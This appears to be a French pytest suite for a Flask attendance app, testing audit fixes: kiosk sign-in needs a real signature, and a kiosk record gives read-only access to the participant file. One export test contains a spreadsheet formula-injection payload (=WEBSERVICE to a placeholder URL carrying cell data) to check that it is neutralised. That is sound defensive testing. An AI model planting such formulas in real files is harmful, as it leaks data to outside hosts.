"""Kiosque et droits (audit C3, 1.1, 1.2, 5.1, 5.2, 5.5).

C3 rejoué : avec le lien d'une séance du secteur A, on faisait émarger sans
signature une personne du secteur B ; la fausse présence ouvrait alors à A
la lecture, la modification, la suppression et l'anonymisation de sa fiche.

Règles désormais :
- le kiosque n'émarge que les personnes proposées à CE navigateur, et
  seulement avec une vraie signature ;
- une présence posée au kiosque ouvre la LECTURE de la fiche au secteur,
  pas la modification, tant que l'équipe ne l'a pas validée ;
- supprimer ou anonymiser : secteur qui a créé la fiche (ou portée structure).
"""
import base64
import uuid
from io import BytesIO

import pytest
from conftest import kiosque_emarger, signature_tracee

MDP = "motdepasse-tests"


def _png(couleur="white", trait=False, mode="RGB"):
    from PIL import Image, ImageDraw
    image = Image.new(mode, (200, 80), couleur)
    if trait:
        ImageDraw.Draw(image).line((10, 40, 190, 45), fill=(0, 0, 0, 255) if mode == "RGBA" else (0, 0, 0), width=2)
    tampon = BytesIO()
    image.save(tampon, "PNG")
    return "data:image/png;base64," + base64.b64encode(tampon.getvalue()).decode()


@pytest.fixture
def monde(app):
    """Deux secteurs, une séance ouverte au kiosque en Numérique, une fiche
    créée par l'EPE, et les comptes des deux secteurs."""
    from app.extensions import db
    from app.models import AtelierActivite, Participant, Role, SessionActivite, User
    from app.utils.dates import utcnow
    cle = uuid.uuid4().hex[:8]
    with app.app_context():
        atelier = AtelierActivite(nom=f"Atelier {cle}", secteur="Numérique")
        db.session.add(atelier)
        db.session.flush()
        s = SessionActivite(atelier_id=atelier.id, secteur="Numérique", session_type="COLLECTIF",
                            kiosk_open=True, kiosk_opened_at=utcnow(), kiosk_token=f"tok{cle}")
        cible = Participant(nom=f"Epe{cle}", prenom="Fiche", created_secteur="EPE")
        db.session.add_all([s, cible])
        comptes = {}
        for code, secteur in (("animateur", "Numérique"), ("responsable_secteur", "Numérique"),
                              ("responsable_secteur", "EPE")):
            email = f"{code}-{secteur}-{cle}@test.fr".lower()
            u = User(email=email, nom=code, secteur_assigne=secteur)
            u.set_password(MDP)
            u.roles.append(Role.query.filter_by(code=code).one())
            db.session.add(u)
            comptes[(code, secteur)] = email
        db.session.commit()
        return {"token": s.kiosk_token, "sid": s.id, "pid": cible.id, "nom": cible.nom, "comptes": comptes}


def _connexion(app, email):
    c = app.test_client()
    c.post("/", data={"email": email, "password": MDP})
    return c


def _presence(app, sid, pid):
    from app.models import PresenceActivite
    with app.app_context():
        return PresenceActivite.query.filter_by(session_id=sid, participant_id=pid).first()


# ---------------------------------------------------------------------------
# Kiosque : qui peut être émargé
# ---------------------------------------------------------------------------

def test_kiosque_refuse_un_identifiant_non_propose(app, monde):
    client = app.test_client()
    r = client.post(f"/kiosk/session/{monde['token']}", data={
        "action": "emarger", "participant_id": monde["pid"], "signature_data": signature_tracee()})
    assert r.status_code == 302
    assert _presence(app, monde["sid"], monde["pid"]) is None


def test_kiosque_emarge_apres_recherche_avec_origine_kiosque(app, monde):
    client = app.test_client()
    r = kiosque_emarger(client, monde["token"], monde["pid"], monde["nom"])
    assert r.status_code == 200
    pr = _presence(app, monde["sid"], monde["pid"])
    assert pr is not None and pr.origine == "kiosque" and pr.signature_path


def test_proposition_ne_vaut_que_pour_ce_navigateur(app, monde):
    """Chercher sur une tablette n'autorise pas un autre appareil à émarger."""
    app.test_client().get(f"/kiosk/session/{monde['token']}/search", query_string={"q": monde["nom"]})
    autre = app.test_client()
    autre.post(f"/kiosk/session/{monde['token']}", data={
        "action": "emarger", "participant_id": monde["pid"], "signature_data": signature_tracee()})
    assert _presence(app, monde["sid"], monde["pid"]) is None


@pytest.mark.parametrize("signature", ["", None, "blanc", "transparent"])
def test_kiosque_exige_une_vraie_signature(app, monde, signature):
    donnees = {"blanc": _png(), "transparent": _png((0, 0, 0, 0), mode="RGBA")}.get(signature, signature)
    client = app.test_client()
    client.get(f"/kiosk/session/{monde['token']}/search", query_string={"q": monde["nom"]})
    data = {"action": "emarger", "participant_id": monde["pid"]}
    if donnees is not None:
        data["signature_data"] = donnees
    client.post(f"/kiosk/session/{monde['token']}", data=data)
    assert _presence(app, monde["sid"], monde["pid"]) is None


def test_bouton_c_est_moi_preremplit_la_personne_proposee(app, monde):
    """Mineur de l'audit : « C'est moi » (doublon proposé) restait sans effet."""
    client = app.test_client()
    client.get(f"/kiosk/session/{monde['token']}/search", query_string={"q": monde["nom"]})
    page = client.get(f"/kiosk/session/{monde['token']}?highlight={monde['pid']}").get_data(as_text=True)
    assert monde["nom"] in page


# ---------------------------------------------------------------------------
# 5.2 : pointée à l'avance par l'animateur, puis signature au kiosque
# ---------------------------------------------------------------------------

def test_signature_kiosque_completee_sur_un_pointage_existant(app, monde):
    from app.extensions import db
    from app.models import PresenceActivite
    with app.app_context():
        db.session.add(PresenceActivite(session_id=monde["sid"], participant_id=monde["pid"],
                                        presence_type="absent_excuse"))
        db.session.commit()
    r = kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    assert "bon" in r.get_data(as_text=True).lower()
    with app.app_context():
        presences = PresenceActivite.query.filter_by(session_id=monde["sid"], participant_id=monde["pid"]).all()
        assert len(presences) == 1
        assert presences[0].signature_path
        assert presences[0].origine == "personnel"  # reste une présence du personnel
        assert presences[0].presence_type == "present"  # finalement venue


def test_deja_signe_reste_refuse(app, monde):
    client = app.test_client()
    kiosque_emarger(client, monde["token"], monde["pid"], monde["nom"])
    premiere = _presence(app, monde["sid"], monde["pid"]).signature_path
    r = kiosque_emarger(client, monde["token"], monde["pid"], monde["nom"])
    assert r.status_code == 302
    assert _presence(app, monde["sid"], monde["pid"]).signature_path == premiere


# ---------------------------------------------------------------------------
# C3 : une présence de kiosque n'ouvre pas les droits d'un secteur
# ---------------------------------------------------------------------------

def test_presence_kiosque_ouvre_la_lecture_pas_la_modification(app, monde):
    from app.extensions import db
    from app.models import Participant
    kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    anim = _connexion(app, monde["comptes"][("animateur", "Numérique")])
    assert anim.get(f"/participants/{monde['pid']}/synthese").status_code == 200
    assert anim.post(f"/participants/{monde['pid']}/edit", data={"nom": "Pirate", "prenom": "X"}).status_code == 403
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    assert resp.post(f"/participants/{monde['pid']}/anonymize").status_code == 403
    assert resp.post(f"/participants/{monde['pid']}/delete",
                     data={"confirmation_nom": monde["nom"]}).status_code == 403
    with app.app_context():
        p = db.session.get(Participant, monde["pid"])
        assert p is not None and p.nom == monde["nom"]


def test_validation_par_l_equipe_ouvre_la_modification_jamais_la_destruction(app, monde):
    from app.extensions import db
    from app.models import AuditLog, Participant
    kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    pr_id = _presence(app, monde["sid"], monde["pid"]).id
    page = resp.get(f"/activite/session/{monde['sid']}/emargement").get_data(as_text=True)
    assert "valider_presence" in page
    resp.post(f"/activite/session/{monde['sid']}/emargement", data={"action": "valider_presence", "presence_id": pr_id})
    assert _presence(app, monde["sid"], monde["pid"]).origine == "personnel"
    with app.app_context():
        assert AuditLog.query.filter_by(action="presence.valider").count() >= 1
    anim = _connexion(app, monde["comptes"][("animateur", "Numérique")])
    anim.post(f"/participants/{monde['pid']}/date-naissance", data={"date_naissance": "1990-01-01"})
    with app.app_context():
        assert str(db.session.get(Participant, monde["pid"]).date_naissance) == "1990-01-01"
    assert resp.post(f"/participants/{monde['pid']}/anonymize").status_code == 403


def test_secteur_createur_peut_anonymiser(app, monde):
    from app.extensions import db
    from app.models import Participant
    epe = _connexion(app, monde["comptes"][("responsable_secteur", "EPE")])
    r = epe.post(f"/participants/{monde['pid']}/anonymize")
    assert r.status_code == 302
    with app.app_context():
        assert db.session.get(Participant, monde["pid"]).nom.startswith("ANONYME")


def test_pointage_par_l_equipe_hors_secteur_est_journalise(app, monde):
    from app.models import AuditLog
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    resp.post(f"/activite/session/{monde['sid']}/emargement", data={"action": "emarger", "participant_id": monde["pid"]})
    pr = _presence(app, monde["sid"], monde["pid"])
    assert pr is not None and pr.origine == "personnel" and not pr.signature_path
    with app.app_context():
        assert AuditLog.query.filter_by(action="presence.hors_secteur",
                                        cible=f"session #{monde['sid']} · participant #{monde['pid']}").count() == 1


def test_pointage_equipe_avec_cadre_vierge_reste_sans_signature(app, monde):
    """Le personnel peut pointer sans faire signer : un cadre vierge n'est pas une erreur."""
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    resp.post(f"/activite/session/{monde['sid']}/emargement", data={
        "action": "emarger", "participant_id": monde["pid"], "signature_data": _png((0, 0, 0, 0), mode="RGBA")})
    pr = _presence(app, monde["sid"], monde["pid"])
    assert pr is not None and not pr.signature_path


# ---------------------------------------------------------------------------
# 1.1 et 1.2
# ---------------------------------------------------------------------------

def test_creation_de_fiche_exige_le_droit(app):
    from app.extensions import db
    from app.models import Participant, User
    email = f"sansrole-{uuid.uuid4().hex[:6]}@test.fr"
    with app.app_context():
        u = User(email=email, nom="Sans role")
        u.set_password(MDP)
        db.session.add(u)
        db.session.commit()
    c = _connexion(app, email)
    nom = f"Intrus{uuid.uuid4().hex[:6]}"
    assert c.post("/participants/new", data={"nom": nom, "prenom": "X", "force_creation": "1"}).status_code == 403
    with app.app_context():
        assert Participant.query.filter_by(nom=nom).count() == 0


def test_ancienne_anonymisation_est_complete_et_journalisee(app, admin_client):
    import datetime as dt
    from app.extensions import db
    from app.models import AuditLog, Participant
    with app.app_context():
        p = Participant(nom=f"Legacy{uuid.uuid4().hex[:6]}", prenom="Anne", created_secteur="Numérique",
                        date_naissance=dt.date(1980, 5, 4), email="anne@test.fr")
        db.session.add(p)
        db.session.commit()
        pid = p.id
    admin_client.post(f"/activite/participant/{pid}/anonymize")
    with app.app_context():
        p = db.session.get(Participant, pid)
        assert p.nom.startswith("ANONYME") and p.date_naissance is None and p.email is None
        assert AuditLog.query.filter_by(action="participant.anonymize", cible=f"participant #{pid}").count() == 1


def test_ancienne_suppression_rapide_ne_supprime_plus(app, admin_client):
    from app.extensions import db
    from app.models import Participant
    with app.app_context():
        p = Participant(nom=f"Garde{uuid.uuid4().hex[:6]}", prenom="B", created_secteur="Numérique")
        db.session.add(p)
        db.session.commit()
        pid = p.id
    r = admin_client.post(f"/activite/participant/{pid}/delete")
    assert r.status_code == 302 and f"/participants/{pid}/edit" in r.headers["Location"]
    with app.app_context():
        assert db.session.get(Participant, pid) is not None


# ---------------------------------------------------------------------------
# 5.5 et 5.1
# ---------------------------------------------------------------------------

def test_service_signature_vide(tmp_path):
    from app.services.signatures import save_signature
    with pytest.raises(ValueError, match="vide"):
        save_signature(_png(), tmp_path, "sig")
    assert save_signature(_png(), tmp_path, "sig", vide_autorise=True) is None
    assert save_signature(_png(trait=True), tmp_path, "sig")
    assert save_signature(_png((0, 0, 0, 0), trait=True, mode="RGBA"), tmp_path, "sig")
    assert len(list(tmp_path.iterdir())) == 2


def test_exports_excel_sans_formule_injectee(app):
    """Un nom « =WEBSERVICE(…) » saisi au kiosque reste du texte dans Excel."""
    from openpyxl import Workbook, load_workbook
    from app.utils.xlsx_safe import Formule
    wb = Workbook()
    ws = wb.active
    ws.append(['=WEBSERVICE("http://exemple/?"&C2)', "Dupont", 12])
    ws["D1"] = Formule("=SUM(C1:C1)")
    ws["E1"] = "=1+1"
    assert ws["A1"].data_type == "s" and ws["E1"].data_type == "s"
    assert ws["D1"].data_type == "f"
    tampon = BytesIO()
    wb.save(tampon)
    relu = load_workbook(BytesIO(tampon.getvalue())).active
    assert relu["A1"].data_type == "s" and relu["A1"].value.startswith("=WEBSERVICE")
    assert relu["D1"].data_type == "f"



def test_origine_indeterminee_lecture_seule_puis_validation_groupee(app, monde):
    """Ancienne présence dont la signature a été purgée : son origine est
    inconnue. Elle n'ouvre que la lecture, jusqu'à validation par l'équipe."""
    from app.extensions import db
    from app.models import AuditLog, Participant, PresenceActivite
    with app.app_context():
        db.session.add(PresenceActivite(session_id=monde["sid"], participant_id=monde["pid"],
                                        origine="indeterminee", signature_path=None))
        db.session.commit()
    anim = _connexion(app, monde["comptes"][("animateur", "Numérique")])
    assert anim.get(f"/participants/{monde['pid']}/synthese").status_code == 200
    anim.post(f"/participants/{monde['pid']}/date-naissance", data={"date_naissance": "1985-05-05"})
    with app.app_context():
        assert db.session.get(Participant, monde["pid"]).date_naissance is None
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    page = resp.get(f"/activite/session/{monde['sid']}/emargement").get_data(as_text=True)
    assert "Origine inconnue" in page and "valider_toutes" in page
    resp.post(f"/activite/session/{monde['sid']}/emargement", data={"action": "valider_toutes"})
    with app.app_context():
        pr = PresenceActivite.query.filter_by(session_id=monde["sid"], participant_id=monde["pid"]).one()
        assert pr.origine == "personnel" and pr.validee_par_user_id and pr.validee_le
        trace = AuditLog.query.filter_by(action="presence.valider").order_by(AuditLog.id.desc()).first()
        assert "indeterminee" in trace.details
    anim.post(f"/participants/{monde['pid']}/date-naissance", data={"date_naissance": "1985-05-05"})
    with app.app_context():
        assert str(db.session.get(Participant, monde["pid"]).date_naissance) == "1985-05-05"


def test_migration_origine_ne_prend_pas_une_signature_purgee_pour_une_validation(app, monde):
    """La reconnaissance de l'origine ne dépend plus du fichier de signature :
    une ligne ancienne sans preuve devient « indeterminee », jamais « personnel »."""
    import contextlib
    import importlib.util
    from pathlib import Path
    from sqlalchemy import text
    from app.extensions import db
    from app.models import Participant, PresenceActivite
    chemin = Path(__file__).resolve().parents[1] / "migrations/versions/d8a1c5e3f786_presence_origine_explicite.py"
    spec = importlib.util.spec_from_file_location("m_origine", chemin)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    with app.app_context():
        ids = []
        for signature in (r"C:\\MCS\\signatures_tmp\\sig_s12_p3_ab.png", "/srv/sig_kiosk_s1_p2_cd.png",
                          "/srv/distance_s4_p5_ef.png", None):
            p = Participant(nom=f"Ancien{uuid.uuid4().hex[:5]}", prenom="X")
            db.session.add(p)
            db.session.flush()
            pr = PresenceActivite(session_id=monde["sid"], participant_id=p.id, signature_path=signature)
            db.session.add(pr)
            db.session.flush()
            ids.append(pr.id)
        db.session.commit()
        # État laissé par la migration précédente : kiosque reconnu, le reste NULL.
        db.session.execute(text("UPDATE presence_activite SET origine = NULL WHERE id IN (%s)" % ",".join(map(str, ids))))
        db.session.execute(text("UPDATE presence_activite SET origine = 'kiosque' WHERE id = :i"), {"i": ids[1]})
        db.session.commit()

        class Op:
            @staticmethod
            def get_bind():
                return db.session.connection()

            @staticmethod
            def execute(sql):
                db.session.execute(text(sql))

            @staticmethod
            @contextlib.contextmanager
            def batch_alter_table(_nom):
                class Rien:
                    def __getattr__(self, _):
                        return lambda *a, **k: None
                yield Rien()
        module.op = Op
        module.upgrade()
        db.session.commit()
        origines = [db.session.get(PresenceActivite, i).origine for i in ids]
    assert origines == ["personnel", "kiosque", "personnel", "indeterminee"]


def test_fusion_conserve_la_seule_signature(app, admin_client, monde):
    """Audit 5.4 : A pointée sans signature, B signée au kiosque sur la même
    séance ; fusion en gardant A : la signature reste."""
    from app.extensions import db
    from app.models import AuditLog, Participant, PresenceActivite
    with app.app_context():
        a = Participant(nom=f"Fusion{uuid.uuid4().hex[:5]}", prenom="A", created_secteur="Numérique")
        b = Participant(nom=a.nom, prenom="A", created_secteur="Numérique")
        db.session.add_all([a, b])
        db.session.flush()
        db.session.add_all([
            PresenceActivite(session_id=monde["sid"], participant_id=a.id, origine="personnel"),
            PresenceActivite(session_id=monde["sid"], participant_id=b.id, origine="kiosque",
                             signature_path="/tmp/sig_kiosk_test.png"),
        ])
        db.session.commit()
        aid, bid = a.id, b.id
    admin_client.post("/participants/merge", data={"keep_id": aid, "merge_ids": [bid]})
    with app.app_context():
        assert db.session.get(Participant, bid) is None
        pr = PresenceActivite.query.filter_by(session_id=monde["sid"], participant_id=aid).one()
        assert pr.signature_path == "/tmp/sig_kiosk_test.png"
        assert pr.origine == "personnel"
        trace = AuditLog.query.filter_by(action="participant.merge", cible=f"participant #{aid}").one()
        assert str(bid) in trace.details


def test_modification_indirecte_par_les_statistiques_refusee(app, monde):
    """Revue route par route : la modification rapide depuis le tableau de
    bord statistiques applique la même règle que la fiche (une présence
    kiosque non validée n'ouvre pas la modification)."""
    from datetime import date
    from app.extensions import db
    from app.models import Participant, SessionActivite
    with app.app_context():
        db.session.get(SessionActivite, monde["sid"]).date_session = date.today()
        db.session.commit()
    kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    page = resp.get("/stats-impact/dashboard", query_string={"tab": "participants"}).get_data(as_text=True)
    assert monde["nom"] in page  # la fiche figure bien dans les statistiques du secteur
    r = resp.post("/stats-impact/dashboard", data={
        "action": "update_participant", "participant_id": monde["pid"], "nom": "Pirate", "prenom": "X"})
    assert r.status_code == 403
    with app.app_context():
        assert db.session.get(Participant, monde["pid"]).nom == monde["nom"]


def test_modification_par_les_statistiques_fonctionne_pour_qui_en_a_le_droit(app, admin_client, monde):
    """Elle plantait (erreur 500 : import local masquant ``db``)."""
    from datetime import date
    from app.extensions import db
    from app.models import Participant, PresenceActivite, SessionActivite
    with app.app_context():
        db.session.get(SessionActivite, monde["sid"]).date_session = date.today()
        db.session.add(PresenceActivite(session_id=monde["sid"], participant_id=monde["pid"]))
        db.session.commit()
    r = admin_client.post("/stats-impact/dashboard", data={
        "action": "update_participant", "participant_id": monde["pid"], "nom": "Corrigé", "prenom": "Fiche"})
    assert r.status_code == 302
    with app.app_context():
        assert db.session.get(Participant, monde["pid"]).nom == "Corrigé"


def test_ancienne_route_de_modification_applique_la_regle_de_la_fiche(app, monde):
    """/activite/participant/<id>/edit ouvrait la modification sur n'importe
    quelle présence du secteur, kiosque compris (trou C3 résiduel)."""
    from app.extensions import db
    from app.models import Participant
    kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    anim = _connexion(app, monde["comptes"][("animateur", "Numérique")])
    anim.post(f"/activite/participant/{monde['pid']}/edit", data={"nom": "Pirate", "prenom": "X"})
    with app.app_context():
        assert db.session.get(Participant, monde["pid"]).nom == monde["nom"]


def test_inscription_annuelle_exige_une_presence_validee(app, monde):
    """Inscrire = modifier : une présence kiosque non validée ne suffit pas."""
    kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    r = resp.get("/inscriptions-annuelles/nouvelle", query_string={"participant_id": monde["pid"]})
    assert r.status_code == 403
    # Une fois la présence validée par l'équipe, l'inscription s'ouvre.
    from app.extensions import db
    from app.models import PresenceActivite
    with app.app_context():
        pr = PresenceActivite.query.filter_by(session_id=monde["sid"], participant_id=monde["pid"]).one()
        pr.origine = "personnel"
        db.session.commit()
    r = resp.get("/inscriptions-annuelles/nouvelle", query_string={"participant_id": monde["pid"]})
    assert r.status_code == 200
